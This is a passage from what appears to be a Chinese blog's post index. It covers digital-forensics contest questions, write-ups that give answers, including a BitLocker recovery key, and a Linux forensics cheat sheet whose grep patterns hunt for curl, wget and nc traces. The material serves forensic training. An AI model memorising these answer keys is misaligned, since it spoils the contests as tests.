号?\n(1 分) [答案格式: 5][手机取证]\n- **3**\n\n### 11. 根据小米手机备份分析，微信好友“wxid_8gmzat7zjnmf22(SunShine)”发给嫌疑人的“membership_commission.sql”脚本文件的 SM3 后六位是多少?\n(1 分) [答案格式: abcdef][手机取证]\n- C8679B3BC3642E6733A79161B9EC766CD99E1383C15CE8820CEB43278AD1F7F2\n- **D1F7F2**\n\n### 12. 同上，通过“membership_commission.sql”脚本文件，请给出会员级别为“gold”的会员人数是多少？\n(1 分)（字母小写）[答案格式: 1][手机取证]\n\n### 13. 同上，通过“membership_commission.sql”脚本文件，请给出会员级别为“silver”且消费金额高于同级别会员(silver)平均消费金额的会员数量是多少？\n(1 分) [答案格式: 3][手机取证]\n- **15**\n\n### 14. 根据小米手机备份分析，微信中“客户信息.xls”有密码保护，已知密码为 4 位数字，请给出这个文件的密码是多少?\n(1 分) [答案格式: 0000][手机取证]\n- **1973**\n### 15. 根据小米手机备份分析，请统计“客户信息.xls”中“电话”列不为空且“城市”为“北京”的数据总共有多少条?\n(1 分) [答案格式: 123456][手机取证]\n![alt text](/img/2025刑事技能大赛_image-3.png)\n- **7**\n### 16. 根据小米手机备份分析，app“umanager”使用 Sqlite 数据库存储数据，其中记录用户信息的表“users”数据已被删除，请分析用户名为“uUser_eelum”的电话号码是多少？\n(1 分) [答案格式: 13112345678][手机取证]\n\n### 17. 同上，在“umanager”app 中有一个配置文件 config.json.enc，但此文件使用 AES 对称加密，请分析此加密密钥是什么?\n(1 分) [答案格式: 123456789abcdef][手机取证]\n\n### 18. 同上，在配置文件 config.json.enc 中记录了管理员 admin 的密码，请给出其密码是什么?\n(1 分) [答案格式: 123456][手机取证]\n\n### 19. 根据小米手机备份分析，“umanager”app 中有一个 transactions.json 文件记录了每个用户收入与支出，请统计用户 ID 为 1512 的总收入是多少?\n(1 分) [答案格式: 10000][手机取证]\n\n### 20. 根据小米手机备份分析，在 app“v2rayNG”中类型为“VLESS”的代理有多少个?\n(1 分) [答案格式: 101][手机取证]\n\n\n# 第五届全国刑事技术技能大赛实操 · 电子物证-计算机部分\n\n说明：下列各题的素材目录位于相应题号下，如题 1、题 2、题 3 的素材位于 C1-3 目录下，题 4 的素材位于 C4 目录下。\n\n在电子数据检验中，因某个 U 盘检材存在不稳定的扇区，每次镜像都会因这些不稳定扇区导致生成的目标文件无法稳定。为了尽最大可能可靠地固定这个 U 盘的原始数据，我们采用了间断性计算哈希的方法。具体方法为：对 U 盘每 1M 的数据计算 SHA256 哈希，将这些哈希值以二进制的方式顺序保存为一个哈希列表文件，再计算这个哈希列表文件的哈希，同时记录不稳定扇区所在的 1M 块号。实际检验中，我们对这个 U 盘做了 2 次副本，分别为 disk#1.dd 和 disk#2.dd，对 disk#1.dd 按上述算法计算的哈希列表文件为 sha256list#1.bin，disk#2.dd 未生成哈希列表。现提供 C1-3 目录下的 disk#2.dd 和 sha256list#1.bin 文件，请分析后回答问题 1~3。\n\n### 1. U 盘的第几 M 存在不稳定扇区（编号从 0 开始）?\n(1 分) [答案格式: 123][计算机取证]\n\n### 2. 这个不稳定扇区影响了哪个文件?（请给出文件名）\n(1 分) [答案格式: abc123][计算机取证]\n\n### 3. 按相同思路对 disk#2.dd 计算 MD5 列表哈希，最终 MD5 哈希值的后 6 位是多少（字母大写）?\n(1 分) [答案格式: A1B2C3][计算机取证]\n\nC4\\data.csv 文件是一份来自某个涉案团伙的绩效提成表。表中包含三列数据：订单号、销售 ID、提成额。提成额的算法为：如果是周一至周五的订单，销售额的 5% 为提成；如果订单是周六日的，提成额为销售额的 10%。请据此规则，通过分析计算后回答问题 4。提示：订单号中包含一个日期值，为订单产生时的时间记录，提成算法中涉及到的日期与此日期值相同。\n\n### 4. ID 为 S006 的销售人员 2024 年第 3 季度的销售额是多少?\n(1 分) [答案格式: 123][计算机取证]\n\n加壳是保护程序不被反编译的一种重要手段。已知 C5\\esend.exe 是一个被简单加过壳的应用程序，其工作原理是在特定条件下搜集用户的敏感信息，并自动发送至某个电子邮箱。邮箱后缀是 trek2025.ngo。提示：脱壳后查找字符串。\n\n### 5. 这个电子邮箱的用户名是什么?\n(1 分) [答案格式: 123abc][计算机取证]\n\nC6-8\\disk.vmdk.7z 中有一个用于业绩统计的软件（路径：虚拟磁盘主分区根目录下的 perf_stat_v6\\perf_stat.exe）。因部分文件破坏，系统无法启动。复制软件出来直接运行提示“程序运行环境异常...”。程序运行时，需要先读取某个名称为 .pem 的密钥文件，再访问注册表 HKEY_CLASSES_ROOT（HKCR）中的某个键值。说明：HKCR 是 HKCU\\Software\\Classes 与 HKLM\\SOFTWARE\\Classes 的合并视图，前者优先。请通过技术手段尝试构建此应用程序所需环境，回答问题 6~8。\n\n### 6. 程序运行时需要依赖的一个 .pem 的文件名称叫什么?\n(1 分) [答案格式: ABC123.pem][计算机取证]\n\n### 7. 程序运行时需要访问的注册表键值中，用到了 HKCR 下某个文件扩展名的子键值（如：HKCR\\.bat\\CombinedValidation 的 REG_SZ 值）。该哈希字符串值的最后 6 个字符是什么（字母大写）?\n(1 分) [答案格式: AB123C][计算机取证]\n\n### 8. 使用用户名 admin，密码 trek2025 登录系统，程序仿真运行后，ID 为 1014 的用户其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC9、C10、C11、C12、C13 目录中，是一个业绩查询系统的不同版本，分别管理不同的数据，管理员用户名均为 admin。请参考各自的背景说明，回答对应问题。\n\nC9 目录下的 perf_stat.exe（V1），数据库 data_v1.db 中密码字段为用户密码的 MD5 单向哈希。破解 admin 用户的密码明文并登录后，回答问题 9。提示：关注密码提示问题；系统对数据库密码字段的修改有校验。\n\n### 9. ID 为 1066 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC10 目录下的 perf_stat.exe（V2），数据库 data_v2.db 中记录的用户密码算法未知，但已知 id 为 1001 的登录密码“trek2025”。该算法同样适用于 admin 管理员。请尝试登录并回答问题 10。\n\n### 10. ID 为 1042 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC11 目录下的 perf_stat.exe（V3），数据库 data_v3.db 中记录的用户密码算法未知。同级目录下提供用于命令方式修改密码的 .NET 程序 ChsaPassword（反编译后生成 \"C11\\V3.ChsaPassword\\Program.cs\"）。利用该信息解除口令限制后登录，回答问题 11。\n\n### 11. ID 为 1082 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC12 目录下的 perf_stat_v4.exe（V4），数据库 data_v4.db 中记录的用户密码算法未知。该版本为 Qt 编写，程序未加壳未混淆，可通过动态跟踪绕过密码。提示：附件中的 x64dbg 可用；密码错误提示是下断点的好信息。\n\n### 12. ID 为 1066 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\nC13 目录下的 perf_stat.exe（V5），数据库 data_v5.db 中记录的用户密码算法未知，但该版本有密码找回功能（通过邮箱重置）。结合数据库和其他必要手段解除登录限制后，回答问题 13。\n提示：找回密码通过明文 SMTP（端口 25，无 TLS/SSL 与鉴权）；C13\\fake_smtp_server 提供 Python 版本和图形版本（管理员权限运行）；admin 的真实姓名为：王一山；建议方法仅供参考。\n\n### 13. ID 为 1062 的用户，其提成总计是多少?\n(1 分) [答案格式: 123][计算机取证]\n\n### 14. C14\\data.pdf 文件无法打开，怀疑进行了简单的加密。请分析文件结构，尝试解密文件，并回答文件第一页中记录的密码是什么?\n(1 分) [答案格式: Aa12b3][计算机取证]\n\n经调查，某 U 盘曾以 docx 存储过一个重要的 BitLocker 恢复密钥。日常使用中除了这个重要文件外，仅保存网站日志的 zip 压缩文件。U 盘已被格式化，原有文件无法直接读取。请对已格式化 U 盘进行深度检索和比对，尝试恢复关键 BitLocker 恢复密钥文件。提示：“C15-17\\disk_cert(old).docx”与目标文件格式相同。\n\n### 15. 问题 1：这个文件的头部位于磁盘的哪个扇区?（扇区大小：512 字节，扇区编号从 0 开始）\n(1 分) [答案格式: 123][计算机取证]\n\n### 16. 问题 2：这个文件的尾部位于磁盘的哪个扇区?（扇区大小：512 字节，扇区编号从 0 开始）\n(1 分) [答案格式: 123][计算机取证]\n\n### 17. 问题 3：文件中记录的 bitlocker 恢复密钥的后 6 位是什么?\n(1 分) [答案格式: Aa12b3][计算机取证]\n\n### 18. 不稳定 U 盘中存储了 key.zip 和其备份 key.bak.zip，导出后两者都打不开。请修复该压缩文件，回答修复后 zip 文件的 SHA256 哈希后 6 位（大写字母）:\n(1 分) [答案格式: ABC123][计算机取证]\n\nC19\\case155.tar.gz 解开后是一个 U 盘镜像，保存着来源于 Linux 服务器的账单文件。history 显示：对/dev/sdb 执行 mkfs.fat，挂载至/mnt；用 \"rsync -ar\" 将/website/access_log 同步到/mnt；最后卸载。拷贝期间无证据显示其他进程访问/dev/sdb。完成后嫌疑人对其中 1 个文件进行了修改，并刷新了所有文件的时间信息（无法通过时间戳判断）。提示：20250403.log 并未被篡改。\n\n### 19. 请综合分析 U 盘存储特征，判定被篡改的具体文件，并回答其文件名称。\n(1 分) [答案格式: file.abc][计算机取证]\n\nC20\\data.vhd 中保存了一批从网站服务器中归档回来的加密密钥，这些文件似乎下载回来都没有用过。已知这些密钥中只有一个用于管理者使用，其他都是普通用户使用的。请通过文件系统底层特征分析判断，在该虚拟磁盘中目录 bak194 下哪个密钥是管理者使用的，回答其文件名称。\n\n### 20. bak194 目录下哪个密钥是管理者使用?（回答文件名称）\n(1 分) [答案格式: file.abc][计算机取证]\n\n\n# 第五届全国刑事技术技能大赛实操 · 电子物证-服务器部分\n\n说明：\n- 可使用 \"RUN-ENV-VM\\trek_sys_v2_exam\" 虚拟机（简称 trek_sys_v2_exam）或其他方式（如 wsl）。\n- 建议使用 ssh 连接（虚拟机内已开启 DHCP）。\n- 建议使用 sftp、samba 等将实验所需文件传入虚拟机（部分素材已在虚拟机中）。\n- 登录用户：trek / trek，具备 sudo 权限，root 未设置。\n- 如虚拟机无法启动，可通过 RUN-ENV-VM 下的 ovf 包导入，路径：\"RUN-ENV-VM\\trek_sys_v2_exam_ovf\\trek_sys_v2_exam.ovf\"。正常启动时忽略该目录。\n\n### 1. 以 HMAC 密钥 trek132 计算 s1_2/lzop-1.04.tar.gz 的 HMAC-SM3 哈希值，填写哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s1_2\" 目录。\n\n### 2. 编译 lzop 源码后对 \"s1_2/55932.pem.lzo\" 解压，回答解压出的唯一文件的 SHA256 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s1_2\"；虚拟机已配置本地 apt 源；缺失头文件需安装 dev 包。\n\n### 3. 还原 s3_4/webbak 网站，以 http://admin.trek2025.ngo/ 为域名进行访问，回答登陆界面显示的 build id\n(1 分) [答案格式: 1234][服务器取证]\n\n### 4. 见上题，还原网站后使用 admin 尝试登陆后台，密码输错后页面中显示的密码提示的 5 位数字是什么\n(1 分) [答案格式: 12345][服务器取证]  \n提示：素材位置 \"s3_4\"；架构为 nginx 代理前端 + go 后端；还原参考 README.txt。\n\n### 5. exam-allinone-flat.tar.xz 是 Docker 容器导出副本。找到网站“comet”对应的 SIGN.pem 并计算其 SHA1 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s5\" 及虚拟机 /home/trek/s5；网站目录 /var/www；数据库配置信息默认位置；可导入容器或静态分析容器备份；容器导入启动参考 cmd.sh。\n\n### 6. d3systemd-with-services-flat.tar.xz 是 Docker 容器导出副本。分析容器激活时 4 个网站是否 active，用 0~15 表示。\n(1 分) [答案格式: 123][服务器取证]  \n网站 1：web-hotel；网站 2：web-golf@8089；网站 3：web-mike；网站 4：web-foxtrot。  \n提示：素材位置 \"s6\" 及虚拟机 /home/trek/s6；容器启动命令见 cmd.sh。\n\nS7_9 目录下数据库是某系统的会员信息库，共 2 张表（用户信息、订单）。各表含义如列名所指。请通过恰当工具分析后回答 3 个问题。\n\n### 7. 该组织架构共有多少层（从某个管理员开始的最深一层为准，管理员记 1 级）\n(1 分) [答案格式: 123][服务器取证]\n\n### 8. 会员表中 ID 为 7623 的人员位于人员层级的第几层（管理员为第 1 层）\n(1 分) [答案格式: 123][服务器取证]\n\n### 9. ID 为 7623 的人员，其下层人数的总佣金(分红)为多少（算法：下第 1 层 5%，第 2 层 3%，第 3 层 1%，第 4 层及以下不计算）\n(1 分) [答案格式: 123][服务器取证]  \n提示：素材位置 \"s7_9\" 目录。\n\n### 10. 尝试利用 chroot 或单用户模式修改 \"s10/bypass_vmware/bypass_case.vmdk\" 中 root 口令。执行 passwd 修改为 trek1009 后屏幕输出的 Executive Code 是多少\n(1 分) [答案格式: 1234][服务器取证]  \n提示：素材位置 \"s10\"；bypass_vmware 可直接运行，ovf 目录为兜底方案；同样版本位于虚拟机 /home/trek/s10；仅用 chroot 或单用户方案，确保 Executive Code 正确。\n\n### 11. key-chal_deleted.tar.xz 是 Docker 容器导出副本。恢复其中的 117.pem 文件，并回答其 SHA1 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s11\" 及虚拟机 /home/trek/s11。\n\n### 12. 虚拟机中曾有名为 5b630a9dab1b 的 Docker 容器于 2025/09/01 和 2025/09/02 日频繁重启。找到该日志数据，回答某天 19:51:52 的重启记录里时间戳纳秒部分的后四位数字。\n(1 分) [答案格式: 1234][服务器取证]  \n提示：日志位置为 docker 默认路径；纳秒数字后紧跟一个字母表示时区。\n\ns13_15/case103 目录中，是某台服务器备份的附件数据。文件原始名称被哈希转译。该目录包含：一个 Linux 可执行文件、一个 trek 格式归档包、一个未加密且数据规律的 sqlite 数据库中间片断，其余为某种加密文件。提示：trek 文件结构定义见 \"TREK2025 Archive Format Specification.md\"。\n\n### 13. 找出该 Linux 二进制可执行文件，回答其文件名称\n(1 分) [答案格式: 1A2B3C4D][服务器取证]\n\n### 14. 找出该 trek 格式归档包，回答其文件名称\n(1 分) [答案格式: 1A2B3C4D][服务器取证]\n\n### 15. 找出该 sqlite 数据库片断，回答其文件名\n(1 分) [答案格式: 1A2B3C4D][服务器取证]\n\n### 16. set_101.tar.gz 解出的网站 nginx 日志（combined log format），统计 referer 为 \"http://www.trek2025.ngo/tcrm/legal-case\" 的唯一 IP 地址数量\n(1 分) [答案格式: 123][服务器取证]  \n提示：combined log format：IP 在首列，之后状态码与响应字节数，之后第一个双引号字段为 referer。\n\n在现场找到了散放的 8 个硬盘。分析并回答下列问题：\n\n### 17. 分析包含 NTFS 文件系统的 RAID，找出创建 RAID 时的成员硬盘，并按数字从小到大组成类似“1236”的字符串（不能排除掉线盘）\n(1 分) [答案格式: 12345][服务器取证]\n\n### 18. 该包含 NTFS 文件系统的 RAID，其组成结构的 chunk 大小为多少 KB\n(1 分) [答案格式: 123][服务器取证]\n\n### 19. 该 RAID 的组成方式最为符合下图的哪一种结构（仅指校验模式、数据排列方法，不特指成员盘数量）\n(1 分) [答案格式: 01][服务器取证]  \n结构编号：01 ~ 10\n\n### 20. 从该 RAID 中恢复 data01.zip 文件，并回答其 SHA256 哈希后 6 位（字母大写）\n(1 分) [答案格式: ABC123][服务器取证]  \n提示：素材位置 \"s17_20\"；参考 sample.dbf.gz（解开的 oracle 数据库用于 raid 结构分析）；oracle 通常 8k 块大小，块 0x00~0x01 为块类型与格式版本标签性明显；0x04~0x07 为数据库块号及文件号规律性明显；data01.zip 恢复后应无损坏。\n\n\n# 第五届全国刑事技术技能大赛实操 · 电子物证-物联网部分\n\n### 1. 该存储镜像 RAW 格式的 SHA256 哈希值后 6 位（字母大写）为多少\n(1 分) [答案格式: ABC123][物联网取证]\n\n### 2. 该路由器后台管理地址是什么\n(1 分) [答案格式: 192.168.1.1][物联网取证]\n\n### 3. 该路由器主机名称是什么\n(1 分) [答案格式: administrator][物联网取证]\n\n### 4. 该路由器使用了哪种开源 vpn 方案\n(1 分) [答案格式: freevpn][物联网取证]\n\n### 5. 该路由器中设置的迅雷下载路径是什么\n(1 分) [答案格式: /opt/download][物联网取证]\n\n### 6. 该路由器下载了什么电影\n(1 分) [答案格式: 变形金刚][物联网取证]\n\n### 7. 该路由器屏蔽了什么广告域名\n(1 分) [答案格式: abc.com][物联网取证]\n\n### 8. 该路由器连接的 IPTV 机顶盒 MAC 地址是什么\n(1 分) [答案格式: DA:11:22:1A:B2:1A][物联网取证]\n\n### 9. 该路由器的上网行为管理中禁止什么应用联网\n(1 分) [答案格式: 浏览器][物联网取证]\n\n### 10. 该路由器的 wifi 启用计划时间范围是什么\n(1 分) [答案格式: 04:00-05:00][物联网取证]","tags":["wp","电子取证"]},{"title":"后缀笔记","url":"/2025/10/25/后缀笔记/","content":"          \n| 后缀 | 含义 |\n| --- | --- |\n| .dat | 通用数据文件，常存储应用私有或二进制数据 |\n| .db | 数据库文件（常见为 SQLite），用于结构化数据持久化 |\n| .ini | 配置文件，以键值对保存程序设置 |\n| .xml | 可扩展标记语言，用于存放结构化数据（配置、备份、日志等） |\n| .plist | 记录苹果基础信息 |","tags":["电子取证"],"categories":["知识点笔记"]},{"title":"解决GitHub开启2FA双重身份验证","url":"/2025/10/25/解决GitHub开启2FA双重身份验证/","content":"- [参考](https://zhuanlan.zhihu.com/p/4456378990)\n- [最后解决方案](https://mp.weixin.qq.com/s/IZrUYvd32ycKFwmuNwrlwQ)","tags":["github"]},{"title":"本地AI安装","url":"/2025/10/24/本地AI安装/","content":"![alt text](/img/本地AI安装_image.png)\n- [Ollama更改下载位置](https://www.cnblogs.com/LaiYun/p/18696931)\n- [【Ollama学习】Ollama + Cherry Studio，2步搞定本地大模型部署](https://blog.csdn.net/weixin_59191169/article/details/148633551)\n- [openwebUI下载](https://docs.openwebui.com/#desktop-app)"},{"title":"linux命令","url":"/2025/10/23/linux命令/","content":"**取证注意事项**\n- 优先只读访问：对磁盘镜像或分区使用只读挂载（示例见“磁盘与镜像”）\n- 保持时间一致：设置统一时区和本地化避免输出差异，例如 `TZ=UTC LC_ALL=C`\n- 先校验后操作：所有采集文件和镜像务必做哈希校验保存（见“哈希与完整性”）\n\n---\n\n## 常用命令：【kali】进入退出root命令\n设置root密码：\n```\nsudo passwd root\n```\n进入root：\n```\nsu root\n```\n退出root：\n```\nsu 用户名\n```\n\n## 文件与元数据\n\n- `pwd`\n  - 作用：明确当前工作目录，记录操作上下文\n  - 示例：``pwd``\n\n- `ls`\n  - 作用：浏览目录与隐藏文件，关注时间戳、权限、所有者\n  - 示例：``ls -al --time-style=full-iso``\n\n- `stat`\n  - 作用：查看文件详细时间戳（atime/mtime/ctime/birth）、权限、大小\n  - 示例：``stat -c '%n %s bytes | atime:%x mtime:%y ctime:%z' /path/to/file``\n\n- `file`\n  - 作用：识别文件类型与魔术字，用于发现伪装扩展名或嵌套数据\n  - 示例：``file suspicious.bin``\n\n- `find`\n  - 作用：全盘检索、时间线筛选、权限异常扫描（如 SUID）\n  - 示例：``find / -xdev -type f -newermt '2025-10-20'``  \n    ``find / -xdev -perm -4000 -type f -ls``\n\n- `grep`\n  - 作用：模式匹配检索关键字、IOC、可疑路径或命令痕迹\n  - 示例：``grep -R --line-number --binary-files=without-match -i 'curl|wget|nc' /etc /var /home``\n\n---\n\n## 内容提取与十六进制\n\n- `strings`\n  - 作用：从二进制中抽取 ASCII/Unicode 字符串，快速发现域名、路径、密钥\n  - 示例：``strings -n 8 sample.bin | grep -i 'http\\|token\\|passwd'``\n\n- `xxd` / `hexdump`\n  - 作用：十六进制查看、偏移定位、签名验证\n  - 示例：``xxd -g 1 -l 512 disk.img``  \n    ``hexdump -C suspicious.dat | head``\n\n- `cat` / `less` / `head` / `tail`\n  - 作用：查看文本与日志，`tail -f`用于实时监控\n  - 示例：``less /var/log/auth.log``  \n    ``tail -n 200 /var/log/syslog``\n\n- `wc` / `sort` / `uniq` / `cut`\n  - 作用：日志与列表的统计、去重与字段裁剪，辅助分析大批量条目\n  - 示例：``cut -d' ' -f1 ip_list.txt | sort | uniq -c | sort -nr``\n\n- `diff`\n  - 作用：比较配置或文件差异，确认未授权变更\n  - 示例：``diff -u /etc/ssh/sshd_config /mnt/baseline/sshd_config``\n\n---\n\n## 日志与账户活动\n\n- `journalctl`\n  - 作用：systemd 日志查询，按时间与单元过滤\n  - 示例：``journalctl --since '2025-10-20' --until '2025-10-23' -u ssh``\n\n- 常见日志路径\n  - 作用：定位系统与安全日志（发行版有差异）\n  - 示例：``/var/log/auth.log``  \n    ``/var/log/secure``  \n    ``/var/log/syslog``  \n    ``/var/log/messages``\n\n- `last` / `lastlog` / `who` / `w`\n  - 作用：登录历史、当前在线用户、会话活动\n  - 示例：``last -F | head``  \n    ``lastlog``  \n    ``w``\n\n- `history`\n  - 作用：Shell 历史命令（注意可能被清理或伪造）\n  - 示例：``cat ~/.bash_history``\n\n---\n\n## 进程与网络\n\n- `ps` / `top` / `htop`\n  - 作用：进程枚举、资源占用、可疑子进程分析\n  - 示例：``ps aux --sort=-%cpu | head``\n\n- `lsof`\n  - 作用：列出进程打开的文件/端口，确认数据外泄或持久化文件句柄\n  - 示例：``lsof -i -P -n``  \n    ``lsof +L1``（查找已删除但仍被占用的文件）\n\n- `ss` / `netstat`\n  - 作用：网络连接与监听端口，识别可疑外联\n  - 示例：``ss -tulpen``  \n    ``netstat -ano``（旧系统）\n\n- `ip` / `ifconfig`\n  - 作用：网卡与地址信息，检查异常路由或配置\n  - 示例：``ip addr``  \n    ``ip route``\n\n- `iptables` / `nft`\n  - 作用：防火墙规则检查，识别临时后门转发\n  - 示例：``iptables -L -n -v``  \n    ``nft list ruleset``\n\n---\n\n## 磁盘与镜像（保全证据）\n\n- `dd`\n  - 作用：位复制创建磁盘/分区镜像，保全原始证据\n  - 示例：``dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync status=progress``\n\n- `dcfldd` / `ddrescue`（如已安装）\n  - 作用：更适合取证的哈希与错误处理、坏盘救援\n  - 示例：``ddrescue -f -n /dev/sda /evidence/disk.img /evidence/mapfile``\n\n- 只读挂载镜像\n  - 作用：避免污染证据，便于浏览文件系统\n  - 示例：``mount -o ro,loop,noexec,nodev,nosuid disk.img /mnt/evidence``\n\n- 分区与块设备\n  - 作用：识别设备与分区布局\n  - 示例：``lsblk -f``  \n    ``blkid``  \n    ``fdisk -l``\n\n---\n\n## 哈希与完整性\n\n- `md5sum` / `sha1sum` / `sha256sum`\n  - 作用：生成与核对哈希，保证采集与分析文件的完整性\n  - 示例：``sha256sum /evidence/disk.img > /evidence/disk.img.sha256``  \n    ``sha256sum -c /evidence/disk.img.sha256``\n\n- `shasum`\n  - 作用：多种哈希摘要接口（依发行版）\n  - 示例：``shasum -a 512 file.bin``\n\n---\n\n## 权限与持久化\n\n- `chmod` / `chown` / `chgrp`\n  - 作用：审查或修正权限（取证时通常只读，不建议修改现场）\n  - 示例：``ls -l /etc/cron.d`` 检查权限异常\n\n- SUID/SGID 检查\n  - 作用：查找可能被滥用的提权二进制\n  - 示例：``find / -xdev -perm -4000 -type f -ls``  \n    ``find / -xdev -perm -2000 -type f -ls``\n\n- Cron 与 systemd 持久化\n  - 作用：发现后门任务或自启动服务\n  - 示例：``ls -al /etc/cron.* /var/spool/cron``  \n    ``ls -al /etc/systemd/system``  \n    ``systemctl list-timers``\n\n- SSH 授权与密钥\n  - 作用：确认未授权公钥或配置变更\n  - 示例：``cat /root/.ssh/authorized_keys``  \n    ``grep -R 'PermitRootLogin' /etc/ssh/sshd_config``\n\n---\n\n## 系统信息与环境\n\n- `uname` / `hostnamectl`\n  - 作用：系统内核、主机名、平台指纹\n  - 示例：``uname -a``  \n    ``hostnamectl``\n\n- `date`\n  - 作用：确认系统时间与时区（建议统一为 UTC）\n  - 示例：``TZ=UTC date -Iseconds``\n\n- `which` / `whereis` / `locate`\n  - 作用：定位可执行文件与资源路径，发现替换或影子副本\n  - 示例：``which ssh``  \n    ``whereis python``  \n    ``updatedb && locate suspicious``\n\n- `df` / `du`\n  - 作用：磁盘使用与异常增长定位\n  - 示例：``df -h``  \n    ``du -h -d1 /var | sort -hr | head``\n\n---\n\n## 压缩与归档\n\n- `tar` / `gzip` / `bzip2` / `xz`\n  - 作用：打包证据与日志，保持目录结构与时间戳（注意只读源）\n  - 示例：``tar -c --numeric-owner --xattrs --acls -zf logs.tar.gz /var/log``\n\n- `zip` / `7z`（如已安装）\n  - 作用：跨平台归档与加密\n  - 示例：``7z a -t7z -mhe=on -p'StrongPass' evidence.7z /evidence``\n\n---\n\n## 文本处理（现场快速分析）\n\n- `awk`\n  - 作用：结构化提取字段、做轻量聚合\n  - 示例：``awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -nr``\n\n- `sed`\n  - 作用：行级替换与过滤，清洗日志内容\n  - 示例：``sed -n 's/Failed password/FAILED/p' /var/log/auth.log``\n\n---\n\n## 证据传输与记录\n\n- `scp` / `rsync`\n  - 作用：安全传输采集材料，与校验结合\n  - 示例：``rsync -av --progress /evidence user@host:/secure/evidence``\n\n- 命令输出记录\n  - 作用：保存取证过程与链路，便于复核\n  - 示例：``script -t 2>timing.log -a session.log``（记录交互会话）\n\n---\n\n## 快速清单（可直接复制执行的实用片段）\n\n- 只读查看系统关键信息\n```\nTZ=UTC LC_ALL=C uname -a\nTZ=UTC LC_ALL=C date -Iseconds\nls -al --time-style=full-iso /etc /var/log /home\n```\n\n- 登录与可疑命令痕迹\n```\nlast -F | head\ncat ~/.bash_history | tail -n 50\ngrep -R -n -i 'curl\\|wget\\|nc\\|ssh' /etc /var /home\n```\n\n- 网络与进程基线\n```\nss -tulpen\nps aux --sort=-%cpu | head\nlsof -i -P -n\n```\n\n- SUID 与持久化检查\n```\nfind / -xdev -perm -4000 -type f -ls\nls -al /etc/cron.* /var/spool/cron\nls -al /etc/systemd/system\n```\n\n- 日志与关键信息提取\n```\njournalctl --since '2025-10-20' --until '2025-10-23' -u ssh\ntail -n 200 /var/log/auth.log\nawk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -nr\n```\n\n- 镜像保全与校验\n```\ndd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync status=progress\nsha256sum /evidence/disk.img > /evidence/disk.img.sha256\nmount -o ro,loop,noexec,nodev,nosuid /evidence/disk.img /mnt/evidence\n```\n\n---\n        \n## Linux 忘记密码解决方法\n![alt text](/img/linux命令_image.png)\n## Linux 文件与目录管理\n![alt text](/img/linux命令_image.png)\n"},{"title":"SPC新生赛即美亚杯选拔赛","url":"/2025/10/23/SPC新生赛即美亚杯选拔赛/","content":"## 致谢\n- 感谢cty学姐和dh学长的帮助！！\n- 拿到了蛮好的成绩嘿嘿嘿开心，但也要认真复盘ヽ( ^ω^ ゞ )\n> 题目来源：某省刑侦个⼈\n## 手机取证\n### 6.【填空题】分析嫌疑人的手机，应用“备忘录记事”中记录了多少年龄小于30岁的人员信息？（答案格式：123）\n正确答案：\n4\n分值：1分\n- 火眼 耗时任务 其他应用 这题没用\n- 火眼-文件-直接找包名sql文件\n  - 注意有两页哦\n- X-ways 方法同火眼\n  - 注意文件打开按钮按下面那个\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-1.png)\n  - 编码调整\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-2.png)\n\n### 8.【单选题】分析嫌疑人的手机，嫌疑人使用文档扫描软件扫描的文件内容是什么？（ ）\nA. 提成分红记录\nB. 诈骗业绩指标\nC. 伪装身份话术\nD. 人员名单\n【正确答案】C. 伪装身份话术\n分值：1分\n- 火眼-文件-直接找包名文件夹内-temp图片\n- X-way同\n\n### 9.【填空题】分析嫌疑人的手机，嫌疑人使用的名称为“薄荷记账”的记账软件共记录了多少笔交易？（答案格式：123）\n正确答案：\n13\n分值：1分\n- X-ways\n  - 递归操作：一般在操作栏左侧选中你需要的文件右键，就把树状结构拍成一个平面\n  - 打开文件最好解压缩后打开文件夹，不然可能解压错误\n[保密部分](/2025/10/27/SPC新生赛即美亚杯选拔赛保密部分)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-3.png)\n\n### 10.【填空题】分析嫌疑人的手机，该记账软件中关于诈骗提成分红的收入明细一共多少钱？（答案格式：123）\n正确答案：\n3281\n分值：1分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-4.png)\n## 计算机取证\n### 4.【填空题】分析嫌疑人的电脑，其电脑BitLocker加密分区的48位恢复密钥的后六位是多少？（答案格式：123456）\n正确答案：\n200189\n分值：2分\n- 查找方式：\n  - 1 明文 2 内存（mem后缀）\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-6.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-7.png)\n- 170258-643148-669911-174548-088726-299772-219439-200189\n### 7.【填空题】分析嫌疑人的电脑，嫌疑人使用的苹果手机序列号是多少？（答案格式：ABCD1234）\n正确答案：\nC8PZFDJXN741\n分值：2分\n- plist后缀文件记录苹果基础信息\n- C8PZFDJXN741\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-8.png)\n### 8.【填空题】分析嫌疑人的电脑，嫌疑人曾使用的苹果手机备份四位数字密码是多少？（答案格式：1234）【待】\n正确答案：\n0122\n分值：2分\n### 9.【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包名称是什么？（答案格式：AbcDe）\n正确答案：\nMetaMask\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-9.png)\n### 10.【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包版本是多少？（答案格式：26.16.0）\n正确答案：\n12.13.0\n分值：2分\n### 